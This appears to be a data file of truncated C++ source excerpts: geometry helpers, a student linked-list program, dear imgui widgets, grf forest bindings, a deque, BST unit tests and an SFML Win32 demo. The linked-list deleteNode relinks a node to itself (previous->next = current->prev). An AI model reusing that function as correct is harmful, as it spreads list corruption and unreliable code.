0., 0.);\n  Vector_3 center(0., 0., 0.);\n  for (const auto& p : points) center += (p - origin);\n  return origin + center / static_cast<double>(points.size());\n}\n\n/* computes the cos angle between vectors t1 and t2\n *\n */\nstd::optional<double> cosAngle(const Vector_3& t1, const Vector_3& t2, bool sign)\n{\n  Vector_3 zero(0, 0, 0);\n  if (t1 == zero || t2 == zero) return std::nullopt;\n  double ca = scalar_product(unitVector(t1), unitVector(t2));\n  return sign ? ca : std::fabs(ca);\n}\n\n/* Computes the cos of angle between vectors (p2-p1) and (p3-p2)\n *\n */\nstd::optional<double> cosAngle(Point_3 p1, Point_3 p2, Point_3 p3, bool sign)\n{\n  return cosAngle(unitVector(p2 - p1), unitVector(p3 - p2), sign);\n}\n\n/* Computes the difference vector\n *\n * Note that size of the output would be 1 less size of the input\n *\n */\ntemplate <class T, class S>\nvoid getDifference(const T& in, S& out)\n{\n  out.clear();\n  for (size_t i = 0; i < in.size() - 1; i++) out.push_back(in[i + 1] - in[i]);\n}\n\n/* Projects a vector onto a plane specified by the normal n\n *\n */\nVector_3 projectVector2Plane(const Vector_3& n, const Vector_3& v) { return v - scalar_product(v, n) * n; }\n\n/* returns a rotation that takes vector \"a\" (direction only) a to vector \"b\" (direction only)\n *\n *\n */\nstd::optional<Affine> getRotation(const Vector_3& a, const Vector_3& b)\n{\n  if (a == Vector_3(0, 0, 0) || b == Vector_3(0, 0, 0)) return std::nullopt;\n\n  Vector_3 m = unitVector(a);\n  Vector_3 n = unitVector(b);\n\n  if (m == -n) return std::nullopt;\n\n  if (m == n) return toAffine(getIdentityMatrix());\n\n  Vector_3 mxn = CGAL::cross_product(m, n);\n  double s2 = mxn.squared_length();\n  if (s2 > 0)\n  {\n    Vector_3 x = m;\n    Vector_3 y = n;\n\n    double factor = 1.0 / (1.0 + CGAL::scalar_product(x, y));\n    const auto S = asymmetricTensorProduct(y, x);\n    const auto SS = S * S;\n    const auto R = getIdentityMatrix() + S + SS * factor;\n\n    return toAffine(R);\n  }\n\n  return toAffine(getIdentityMatrix());\n}\n\nstd::optional<Affine> alignAndTranslate(const Vector_3& reference, const Vector_3& targ",
    "#include <iostream>\n#include <string>\nusing namespace std; \n\nstruct Node\n{\n\tint noMhs; \n\tstring name; \n\tNode* next; \n\tNode* prev; \n};\n\nNode *START = NULL;\n\nvoid addNode() {\n\tNode* newNode = new Node();  // step 1: create a new node \n\tcout << \"\\nEnter the roll number of the student: \";\n\tcin >> newNode->noMhs;  // Assign value to the data field of the new node \n\tcout << \"\\nEnter the name of the student: \";\n\tcin >> newNode->name;  //Assign value to the data field of the new node \n\n\n\t// Insert the new node in the list \n\tif (START == NULL || newNode->noMhs <= START->noMhs) { // step 2: insert the new node \n\n\t\tif (START != NULL && newNode->noMhs == START->noMhs) {\n\t\t\tcout << \"\\033[31Dumplicate roll numbers not allowed\\033[0m\" << endl;\n\t\t\treturn;\n\t\t}\n\t\t// if the list is empty, make the new node the START \n\t\tnewNode->next = START;  // step 3: make the new node point to the first node \n\t\tif (START != NULL) {\n\t\t\tSTART->prev = newNode; \t// STEP 4: make the first node point to the new node \n\n\t\t}\n\t\tnewNode->prev = NULL;\t// step 5: make the new node point to NULL\n\t\tSTART = newNode;\t\t// step 6: make the new node the first node \n\t}\n\telse {\n\t\t// insert the new node in the middle or at the end \n\t\tNode* current = START;  // step 1.a: start from the first node \n\t\tNode* previous = NULL;  // step 1.b: previous node is NULL initially \n\n\t\twhile (current != NULL && current->noMhs < newNode->noMhs) { // step 1.c: traverse \n\t\t\tprevious = current; // step 1.d: move the previous to the current node \n\t\t\tcurrent = current->next;  // step 1>e: move the current to the next node \n\t\t}\n\n\t\tnewNode->next = current; // step 4. Make the next field of the new node point\n\t\tnewNode->prev = previous; // step 5. make the previous field of the new node point \n\n\t\tif (current != NULL) {\n\t\t\tcurrent->prev = newNode; //step 6. Make the previous field of the current new node \n\t\t}\n\n\t\tif (previous != NULL) {\n\t\t\tprevious->next = newNode; // step 7. Make the next field of the previous node \n\t\t}\n\t\telse {\n\t\t\t// if previous is still NULL, it means newNode is now the first node \n\t\t\tSTART = newNode;\n\t\t}\n\t}\n}\nbool search(int rollNo, Node **previous, Node **current)\n{\n\t*previous = NULL;\n\t*current = START;\n\twhile (*current != NULL && (*current)->noMhs != rollNo)\n\t{\n\t\t*previous = *current;\n\t\t*current = (*current)->next;\n\t}\n\treturn (*current != NULL);\n}\n\nvoid deleteNode()\n{\n\tNode* previous, * current; // \n\tint rollNo;\n\n\tcout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n\tcin >> rollNo; // step 3: get the roll number to be deleted \n\n\tif (START == NULL)\n\t{\n\t\tcout << \"List is empty\" << endl;\n\t\treturn;\n\t}\n\n\tcurrent = START; // Step 1: start from the first node \n\tprevious = NULL;\n\n\t// Locate the node to be deleted \n\twhile (current != NULL && current->noMhs != rollNo)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\n\tif (current == NULL)\n\t{\n\t\tcout << \"\\033[31mthe record with roll number \" << rollNo << \" not found\\033[0m\" << endl;\n\t\treturn;\n\t}\n\n\t// Node to be deleted is the first node \n\tif (current == START)\n\t{\n\t\tSTART = START->next; //step 2: update the START pointer\n\t\tif (START != NULL)\n\t\t{\t\t\t\t\t\t//\n\t\t\tSTART->prev = NULL; // step \n\t\t}\n\t}\n\telse\n\t{ // Node to be deleted is not the first node \n\t\tprevious->next = current->prev;\n\t\tif (current->next != NULL)\n\t\t{ // If there's a successor, update its prev pointer \n\t\t\tcurrent->next->prev = previous;\n\t\t}\n\t}\n\n\t// Release the memory of the node marked as current \n\tdelete current;\n\tcout << \"\\x1b[32mRecord with roll number \" << rollNo << \" deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n\treturn (START == NULL);\n}\nvoid traverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl; \n\telse\n\t{\n\t\tcout << \"\\nRecords in asceding order of roll number are:\" << endl;\n\t\tNode* currentNode = START;  //step 1 \n\t\twhile (currentNode != NULL)\t//step 2\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl; //step 3\n\t\t\tcurrentNode = currentNode->next;\t\t\t\t\t\t\t\t// step 4\n\t\t}\n\t}\n}\nvoid revtraverse()\n{\n\n\tif (listEmpty())\n\t\tcout << \"\\nRecords in descending order of roll number are:\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecords im descending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode->next != NULL)\n\t\t\tcurrentNode = currentNode->next;\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->prev;\n\t\t}\n\n\t}\n}\n\nvoid searchData()\n{\n\tif (listEmpty() == true)\n\t{\n\t\tcout << \"\\nList is empty\" << endl;\n\t}\n\tNode* prev, *curr; \n\tprev = curr = NULL; \n\tcout << \"\\nEnter the roll number of the student whose record you want to seacrh: \"; \n\tint num; \n\tcin >> num; \n\tif (search(num, &prev, &curr) == false)\n\t\tcout << \"\\nRecord not found\" << endl; \n\telse\n\t{\n\t\tcout << \"\\nRecord found\" << endl; \n\t\tcout << \"\\nRoll number: \" << curr->noMhs << endl; \n\t\tcout << \"\\nName: \" << curr->name << endl; \n\t}\n}\nint main()\n{\n\twhile (true)\n\t{\n\t\ttry\n\t\t{\n\t\t\tcout << \"\\nMenu\" << endl;\n\t\t\tcout << \"1. Add a record to the list\" << endl;\n\t\t\tcout << \"",
    "// dear imgui, v1.85 WIP\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n#include \"imgui_internal.h\"\n\n// System includes\n#include <ctype.h>      // toupper\n#if defined(_MSC_VER) && _MSC_VER <= 1500 // MSVC 2008 or earlier\n#include <stddef.h>     // intptr_t\n#else\n#include <stdint.h>     // intptr_t\n#endif\n#include <map>\n\n//-------------------------------------------------------------------------\n// Warnings\n//-------------------------------------------------------------------------\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                          // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"                // warning: format not a string literal, ",
    "/*-------------------------------------------------------------------------------\n  This file is part of generalized random forest (grf).\n\n  grf is free software: you can redistribute it and/or modify\n  it under the terms of the GNU General Public License as published by\n  the Free Software Foundation, either version 3 of the License, or\n  (at your option) any later version.\n\n  grf is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n  GNU General Public License for more details.\n\n  You should have received a copy of the GNU General Public License\n  along with grf. If not, see <http://www.gnu.org/licenses/>.\n #-------------------------------------------------------------------------------*/\n\n#include <Rcpp.h>\n#include <vector>\n\n#include \"commons/globals.h\"\n#include \"forest/ForestPredictors.h\"\n#include \"forest/ForestTrainers.h\"\n#include \"RcppUtilities.h\"\n\nusing namespace grf;\n\n// [[Rcpp::export]]\nRcpp::List instrumental_train(const Rcpp::NumericMatrix& train_matrix,\n                              size_t outcome_index,\n                              size_t treatment_index,\n                              size_t instrument_index,\n                              size_t sample_weight_index,\n                              bool use_sample_weights,\n                              unsigned int mtry,\n                              unsigned int num_trees,\n                              unsigned int min_node_size,\n                              double sample_fraction,\n                              bool honesty,\n                              double honesty_fraction,\n                              bool honesty_prune_leaves,\n                              size_t ci_group_size,\n                              double reduced_form_weight,\n                              double alpha,\n                              double imbalance_penalty,\n                              bool stabilize_splits,\n                              std::vector<size_t> clusters,\n                              unsigned int samples_per_cluster,\n                              bool compute_oob_predictions,\n                              unsigned int num_threads,\n                              unsigned int seed) {\n  ForestTrainer trainer = instrumental_trainer(reduced_form_weight, stabilize_splits);\n\n  Data data = RcppUtilities::convert_data(train_matrix);\n  data.set_outcome_index(outcome_index);\n  data.set_treatment_index(treatment_index);\n  data.set_instrument_index(instrument_index);\n  if (use_sample_weights) {\n    data.set_weight_index(sample_weight_index);\n  }\n\n  ForestOptions options(num_trees, ci_group_size, sample_fraction, mtry, min_node_size, honesty,\n      honesty_fraction, honesty_prune_leaves, alpha, imbalance_penalty, num_threads, seed, clusters, samples_per_cluster);\n  Forest forest = trainer.train(data, options);\n\n  std::vector<Prediction> predictions;\n  if (compute_oob_predictions) {\n    ForestPredictor predictor = instrumental_predictor(num_threads);\n    predictions = predictor.predict_oob(forest, data, false);\n  }\n\n  return RcppUtilities::create_forest_object(forest, predictions);\n}\n\n// [[Rcpp::export]]\nRcpp::List instrumental_predict(const Rcpp::List& forest_object,\n                                const Rcpp::NumericMatrix& train_matrix,\n                                size_t outcome_index,\n                                size_t treatment_index,\n                                size_t instrument_index,\n                                const Rcpp::NumericMatrix& test_matrix,\n                                unsigned int num_threads,\n                                bool estimate_variance) {\n  Data train_data = RcppUtilities::convert_data(train_matrix);\n  train_data.set_outcome_index(outcome_index);\n  train_data.set_treatment_index(treatment_index);\n  train_data.set_instrument_index(instrument_index);\n  Data data = RcppUtilities::convert_data(test_matrix);\n\n  Forest forest = RcppUtilities::deserialize_forest(forest_object);\n\n  ForestPredictor predictor = instrumental_predictor(num_threads);\n  std::vector<Prediction> predictions = predictor.predict(forest, train_data, data, estimate_variance);\n  Rcpp::List result = RcppUtilities::create_prediction_object(predictions);\n\n  return result;\n}\n\n// [[Rcpp::export]]\nRcpp::List instrumental_predict_oob(const Rcpp::List& forest_object,\n                                    const Rcpp::NumericMatrix& train_matrix,\n                                    size_t outcome_index,\n                                    size_t treatment_index,\n                                    size_t instrument_index,\n                                    unsigned int num_threads,\n                                    bool estimate_variance) {\n  Data data = RcppUtilities::convert_data(train_matrix);\n  data.set_outcome_index(outcome_index);\n  data.set_treatment_index(treatment_index);\n  data.set_instrument_index(instrument_index);\n\n  Forest",
    "\n#include \"deque.h\"\n#include <utility>\n\nvoid deque::check_invariant( ) const\n{\n   if( deq_size == 0 )\n   {\n      if( deq_front )\n         throw std::logic_error( \"size == 0, but front != nullptr\" );\n      if( deq_back )\n         throw std::logic_error( \"size == 0, but back != nullptr\" );\n   }\n   else\n   {\n      size_t truesize = 0;\n\n      if( deq_front -> prev )\n         throw std::logic_error( \"prev of front not nullptr \" );\n      if( deq_back -> next )\n         throw std::logic_error( \"next of back not nullptr\" );\n\n      for( auto p = deq_front; p; p = p -> next ) \n      {\n         // If p has a next, its prev must be p.\n         // If p has no next, p must be the back of the deque. \n\n         if( p -> next )\n         {\n            if( p -> next -> prev != p )\n               throw std::logic_error( \"prev or next is wrong\" );\n         }\n         else\n         {\n            if( p != deq_back )\n               throw std::logic_error( \"deq_back is wrong\" );\n         } \n         ++ truesize;\n      } \n\n      if( truesize != deq_size )\n         throw std::logic_error( \"deq_size is wrong\" ); \n   }\n}\n\n\ndeque::deque( ) noexcept\n: deq_size(0), deq_front(nullptr), deq_back(nullptr) { }\n\n\n\nvoid deque::push_back( const valtype& val )\n{\n   node* new_node = new node (val);\n   if (this->deq_back) {\n      this->deq_back->next = new_node;\n      new_node->prev = this->deq_back;\n      this->deq_back = new_node;\n   } \n   else {\n      this->deq_front = new_node;\n      this->deq_back = new_node;\n   }\n   this->deq_size ++;\n}\n\nvoid deque::pop_back( )\n{\n   if (this->deq_size == 0) {\n      throw std::logic_error( \"size == 0!\" );\n   }\n   if (this->deq_size == 1) {\n      delete deq_front;\n      deq_front = nullptr;\n      deq_back = nullptr;\n   }\n   else {\n      delete std::exchange(this->deq_back, this->deq_back->prev);\n      this->deq_back->next = nullptr;\n   }\n   this->deq_size --;\n}\n\nconst deque::valtype& deque::back( ) const\n{\n   if (this->deq_size == 0) {\n      throw std::logic_error( \"size == 0!\" );\n   }\n   return this->deq_back->val;\n}\n\ndeque::valtype& deque::deque::back( )\n{\n   if (this->deq_size == 0) {\n      throw std::logic_error( \"size == 0!\" );\n   }\n   return this->deq_back->val;\n}\n\n// front methods:\n\nvoid deque::push_front( const valtype& val ) \n{  \n   node* new_node = new node (val);\n   if (this->deq_front) {\n      this->deq_front->prev = new_node;\n      new_node->next = this->deq_front;\n      this->deq_front = new_node;\n   }\n   else{\n      this->deq_front = new_node;\n      this->deq_back = new_node;  \n   }\n   this->deq_size ++;\n}\n\nvoid deque::pop_front( )\n{\n\n   if (this->deq_size == 0) {\n      throw std::logic_error( \"size == 0!\" );\n   }\n   if (this->deq_size == 1) {\n      delete deq_front;\n      deq_front = nullptr;\n      deq_back = nullptr;\n   }\n   else {\n      delete std::exchange(this->deq_front, this->deq_front->next);\n      this->deq_front->prev = nullptr;\n   }\n   this->deq_size --;\n}\n\n\nconst deque::valtype& deque::front( ) const\n{\n   if (this->deq_size == 0) {\n      throw std::logic_error( \"size == 0!\" );\n   }\n   else return this->deq_front->val;\n}\n\ndeque::valtype& deque::deque::front( )\n{\n   if (this->deq_size == 0) {\n      throw std::logic_error( \"size == 0!\" );\n   }\n   else return this->deq_front->val;\n}\n\nvoid deque::print( std::ostream& out ) const\n{\n   node* current_node = this->deq_front;\n   out << \"[ \";\n   bool check = 0;\n   while (current_node) {\n      if (check == 0) {\n         out << current_node->val;\n         check = 1;\n      }\n      else {\n         out << \", \" << current_node->val;\n      }\n      current_node = current_node->next;\n   }\n   out << \" ]\";\n}\n\n\ndeque::deque( const deque& q ) : deque( )\n{\n   this->deq_size = 0;\n   this->deq_front = nullptr;\n   this->deq_back = nullptr;\n   \n   node* current_node = q.deq_front;\n\n   while (current_node) {\n      this->push_back(current_node->val);\n      current_node = current_node->next;\n   }\n\n}\n\ndeque::deque( std::initializer_list< valtype > init )\n   : deque( ) \n{\n   for (auto value : init) {\n      this->push_back(value);\n   }\n}\n\ndeque:: ~deque( ) \n{\n   node* current_node = this->deq_front;\n\n   while (current_node) {\n      delete std::exchange(current_node, current_node->next);\n   }\n\n   deq_size = 0;\n\n}\n\n\nvoid deque::reset_front( size_t s )\n{\n   if (this->deq_size < s) {\n      throw std::logic_error( \"The deque size is less than the given number!\" );\n   }\n   while (this->deq_size > s) {\n      this->pop_front();\n   }\n}\n\nvoid deque::reset_back( size_t s )\n{\n   if (this->deq_size < s) {\n      throw std::logic_error( \"The deque size is less than the given number!\" );\n   }\n   while (this->deq_size > s) {\n      this->pop_back();\n   }\n}\n\n\nconst deque& deque::operator = ( const deque& q )\n{\n   if (this == &q) {\n      return *this;\n   }\n   this->reset_back(0);\n\n   node* current_node = q.deq_front;\n\n   while (current_node) {\n      this->push_back(current_node->val);\n      current_node = current_node->next;\n   }\n\n   return *this;\n}\n\nsize_t deque::size( ) const \n{\n   retu",
    "#include \"gtest/gtest.h\"\n#include <bst.h>\n\nTEST(ConstructorsTestSuite, DefaultConstructor_PreOrderTraversal) {\n    BST::BinarySearchTree<int, BST::PreOrderTraversal> bst;\n\n    ASSERT_TRUE(bst.empty() && bst.size() == 0 && bst.begin() == bst.end() && bst.cbegin() == bst.cend());\n}\nTEST(ConstructorsTestSuite, DefaultConstructor_InOrderTraversal) {\n    BST::BinarySearchTree<std::string, BST::InOrderTraversal> bst;\n\n    ASSERT_TRUE(bst.empty() && bst.size() == 0 && bst.begin() == bst.end() && bst.cbegin() == bst.cend());\n}\n\nTEST(ConstructorsTestSuite, DefaultConstructor_PostOrderTraversal) {\n    BST::BinarySearchTree<char, BST::PostOrderTraversal> bst;\n\n    ASSERT_TRUE(bst.empty() && bst.size() == 0 && bst.begin() == bst.end() && bst.cbegin() == bst.cend());\n}\n\nTEST(ConstructorsTestSuite, CopyConstructor_PreOrderTraversal) {\n    BST::BinarySearchTree<int, BST::PreOrderTraversal> bst;\n    bst.insert({10, 2, 1, 3, 11, 5, 100, 99, 101, 4});\n    BST::BinarySearchTree<int, BST::PreOrderTraversal> bst_copy(bst);\n\n    ASSERT_EQ(bst, bst_copy);\n}\n\nTEST(ConstructorsTestSuite, CopyConstructor_InOrderTraversal) {\n    BST::BinarySearchTree<char, BST::InOrderTraversal> bst;\n    bst.insert({'a', '\\n', '1', 'm', '#', '*'});\n    BST::BinarySearchTree<char, BST::InOrderTraversal> bst_copy(bst);\n\n    ASSERT_EQ(bst, bst_copy);\n}\n\nTEST(ConstructorsTestSuite, CopyConstructor_PostOrderTraversal) {\n    BST::BinarySearchTree<std::string, BST::PostOrderTraversal> bst;\n    bst.insert({\"test\", \"name\", \"12345678910\", \"#\", \"adasd\", \"\\n\"});\n    BST::BinarySearchTree<std::string, BST::PostOrderTraversal> bst_copy(bst);\n\n    ASSERT_EQ(bst, bst_copy);\n}\n\nTEST(ConstructorsTestSuite, InitializerListConstructor_PreOrderTraversal) {\n    BST::BinarySearchTree<std::vector<double>, BST::PreOrderTraversal> bst({{1, 2.33, 3}, {10, -11.0001, 31.88}, {-1}, {23, 31.1}});\n    std::vector<std::vector<double>> correct_traversal = {{1, 2.33, 3}, {-1}, {10, -11.0001, 31.88}, {23, 31.1}};\n\n    ASSERT_EQ(bst.TraversalToVector(), correct_traversal);\n}\n\nTEST(ConstructorsTestSuite, InitializerListConstructor_InOrderTraversal) {\n    BST::BinarySearchTree<long long, BST::InOrderTraversal> bst = {300, 11, 2, -1, -5, 20, 21, 15};\n    std::vector<long long> correct_traversal = {-5, -1, 2, 11, 15, 20, 21, 300};\n\n    ASSERT_EQ(bst.TraversalToVector(),  correct_traversal);\n}\n\nTEST(ConstructorsTestSuite, InitializerListConstructor_PostOrderTraversal) {\n    BST::BinarySearchTree<char, BST::PostOrderTraversal> bst = {'a', 'c', 'b', 'd'};\n    std::vector<char> correct_traversal = {'b', 'd', 'c', 'a'};\n\n    ASSERT_EQ(bst.TraversalToVector(), correct_traversal);\n}\n\nTEST(ConstructorsTestSuite, IteratorsRangeConstructor_PreOrderTraversal) {\n    BST::BinarySearchTree<int, BST::PreOrderTraversal> bst = {2, 3, 1};\n    BST::BinarySearchTree<int, BST::PreOrderTraversal> bst_new(bst.begin(), bst.end());\n\n    ASSERT_EQ(bst, bst_new);\n}\n\nTEST(ConstructorsTestSuite, IteratorsRangeConstructor_InOrderTraversal) {\n    BST::BinarySearchTree<int, BST::InOrderTraversal> bst = {2, 3, 1, 4};\n    BST::BinarySearchTree<int, BST::InOrderTraversal> bst_new(++bst.begin(), bst.end());\n\n    ASSERT_FALSE(bst == bst_new);\n}\n\nTEST(ConstructorsTestSuite, IteratorsRangeConstructor_PostOrderTraversal) {\n    BST::BinarySearchTree<int, BST::PostOrderTraversal> bst = {2, 3, 1, 4};\n    BST::BinarySearchTree<int, BST::PostOrderTraversal> bst_new(++bst.begin(), --bst.end());\n\n    ASSERT_FALSE(bst == bst_new);\n}\n\nTEST(OperatorsTestSuite, EqualOperator_EmptyContainers) {\n    BST::BinarySearchTree<char, BST::PreOrderTraversal> bst_1, bst_2;\n\n    ASSERT_EQ(bst_1, bst_2);\n}\n\nTEST(OperatorsTestSuite, EqualOperator_True) {\n    BST::BinarySearchTree<std::string, BST::InOrderTraversal> bst_1 = {\"1\", \"aboasd\", \"!\"}, bst_2 = {\"1\", \"!\", \"aboasd\"};\n\n    ASSERT_EQ(bst_1, bst_2);\n}\n\nTEST(OperatorsTestSuite, EqualOperator_False) {\n    BST::BinarySearchTree<std::string, BST::PostOrderTraversal> bst_1 = {\"1\", \"aboasd\", \"!\"}, bst_2 = {\"1\", \"!!\", \"aboasd\"};\n\n    ASSERT_FALSE(bst_1 == bst_2);\n}\n\nTEST(OperatorsTestSuite, AssignmentOperator_EmptyContainers) {\n    BST::BinarySearchTree<char, BST::PreOrderTraversal> bst_1, bst_2;\n    bst_1 = bst_2;\n\n    ASSERT_EQ(bst_1, bst_2);\n}\n\nTEST(OperatorsTestSuite, AssignmentOperator_True) {\n    BST::BinarySearchTree<int, BST::InOrderTraversal> bst_1 = {2, 23, 1, -4, 10}, bst_2;\n    bst_2 = bst_1;\n    bst_1.erase(23);\n    std::vector<int> correct_traversal = {-4, 1, 2, 10, 23};\n\n    ASSERT_TRUE(bst_2.TraversalToVector() == correct_traversal && bst_1 != bst_2);\n}\n\nTEST(OperatorsTestSuite, AssignmentOperator_False) {\n    BST::BinarySearchTree<int, BST::PostOrderTraversal> bst_1 = {2, 23, 1, -4, 10}, bst_2;\n    bst_1 = bst_2;\n    std::vector<int> correct_traversal = {-4, 1, 10, 23, 2};\n\n    ASSERT_FALSE(bst_1.TraversalToVector() == correct_traversal);\n}\n\nTEST(IteratorsTestSuite, NonConstIterators) {\n    BST::BinarySearchTree<int, BST::PreOrderTraversal> bst = {3, 1, 5, 4, 100, -9};\n    std::vector<int> ",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include <SFML/Graphics.hpp>\n#include <windows.h>\n#include <cmath>\n\nHWND button;\n\n\n////////////////////////////////////////////////////////////\n/// Function called whenever one of our windows receives a message\n///\n////////////////////////////////////////////////////////////\nLRESULT CALLBACK onEvent(HWND handle, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    switch (message)\n    {\n        // Quit when we close the main window\n        case WM_CLOSE:\n        {\n            PostQuitMessage(0);\n            return 0;\n        }\n\n        // Quit when we click the \"quit\" button\n        case WM_COMMAND:\n        {\n            if (reinterpret_cast<HWND>(lParam) == button)\n            {\n                PostQuitMessage(0);\n                return 0;\n            }\n        }\n    }\n\n    return DefWindowProc(handle, message, wParam, lParam);\n}\n\n\n////////////////////////////////////////////////////////////\n/// Entry point of application\n///\n/// \\param Instance: Instance of the application\n///\n/// \\return Error code\n///\n////////////////////////////////////////////////////////////\nint main()\n{\n    HINSTANCE instance = GetModuleHandle(NULL);\n\n    // Define a class for our main window\n    WNDCLASS windowClass;\n    windowClass.style         = 0;\n    windowClass.lpfnWndProc   = &onEvent;\n    windowClass.cbClsExtra    = 0;\n    windowClass.cbWndExtra    = 0;\n    windowClass.hInstance     = instance;\n    windowClass.hIcon         = NULL;\n    windowClass.hCursor       = 0;\n    windowClass.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_BACKGROUND);\n    windowClass.lpszMenuName  = NULL;\n    windowClass.lpszClassName = TEXT(\"SFML App\");\n    RegisterClass(&windowClass);\n\n    // Let's create the main window\n    HWND window = CreateWindow(TEXT(\"SFML App\"), TEXT(\"SFML Win32\"), WS_SYSMENU | WS_VISIBLE, 200, 200, 660, 520, NULL, NULL, instance, NULL);\n\n    // Add a button for exiting\n    button = CreateWindow(TEXT(\"BUTTON\"), TEXT(\"Quit\"), WS_CHILD | WS_VISIBLE, 560, 440, 80, 40, window, NULL, instance, NULL);\n\n    // Let's create two SFML views\n    HWND view1 = CreateWindow(TEXT(\"STATIC\"), NULL, WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS, 20,  20, 300, 400, window, NULL, instance, NULL);\n    HWND view2 = CreateWindow(TEXT(\"STATIC\"), NULL, WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS, 340, 20, 300, 400, window, NULL, instance, NULL);\n    sf::RenderWindow SFMLView1(view1);\n    sf::RenderWindow SFMLView2(view2);\n\n    // Load some textures to display\n    sf::Texture texture1, texture2;\n    if (!texture1.loadFromFile(\"resources/image1.jpg\") || !texture2.loadFromFile(\"resources/image2.jpg\"))\n        return EXIT_FAILURE;\n    sf::Sprite sprite1(texture1);\n    sf::Sprite sprite2(texture2);\n    sprite1.setOrigin(sf::Vector2f(texture1.getSize()) / 2.f);\n    sprite1.setPosition(sprite1.getOrigin());\n\n    // Create a clock for measuring elapsed time\n    sf::Clock clock;\n\n    // Loop until a WM_QUIT message is received\n    MSG message;\n    message.message = static_cast<UINT>(~WM_QUIT);\n    while (message.message != WM_QUIT)\n    {\n        if (PeekMessage(&message, NULL, 0, 0, PM_REMOVE))\n        {\n            // If a message was waiting in the message queue, process it\n            TranslateMessage(&message);\n            DispatchMessage(&message);\n        }\n        else\n        {\n            float time = 